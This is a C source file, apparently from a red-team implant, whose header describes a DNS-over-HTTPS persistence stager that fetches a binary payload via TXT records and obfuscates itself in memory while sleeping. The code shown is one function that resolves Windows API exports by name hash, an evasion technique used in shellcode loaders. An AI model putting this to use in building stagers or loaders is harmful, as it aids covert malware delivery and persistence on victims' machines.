/*-
 *
 * dns over http(s) persistence stager.
 * grabs a binary payload over a txt
 * record before going back to sleep
 * for a specified time.
 *
 * before going to sleep, it will try
 * to obfuscate itself in memory and
 * hide its return address.
 *
 * Copyright (c) 2021 Austin Hudson
 * Copyright (c) 2021 GuidePoint Security LLC
 *
-*/

#include "common.h"

D_SEC(B) PVOID PeGetFuncEat( PVOID Ptr, ULONG Hsh )
{
	PIMAGE_DOS_HEADER       dos;
	PIMAGE_NT_HEADERS       nth;
	PIMAGE_DATA_DIRECTORY   dir;
	PIMAGE_EXPORT_DIRECTORY exp;
	PDWORD                  aof;
	PDWORD                  aon;
	PUSHORT                 ano;
	PCHAR                   str;
	DWORD                   cnt;
	ULONG                   hxp;

	dos = C_PTR( Ptr );
	nth = C_PTR( U_PTR(dos) + dos->e_lfanew );
	dir = C_PTR( &nth->OptionalHeader.DataDirectory[0] );

	if ( dir->VirtualAddress ) {
		exp = C_PTR( U_PTR(dos) + dir->VirtualAddress );
		aof = C_PTR( U_PTR(dos) + exp->AddressOfFunctions );
		aon = C_PTR( U_PTR(dos) + exp->AddressOfNames );
		ano = C_PTR( U_PTR(dos) + exp->AddressOfNameOrdinals );

		for( cnt=0;cnt<exp->NumberOfNames;++cnt ) {	
			str = C_PTR( U_PTR(dos) + aon[cnt] );
			hxp = HashString(str, 0);

			if ( hxp == Hsh ) {
				return C_PTR( U_PTR(dos) + aof[ano[cnt]] );
			};
		};
	};
	return NULL;
};
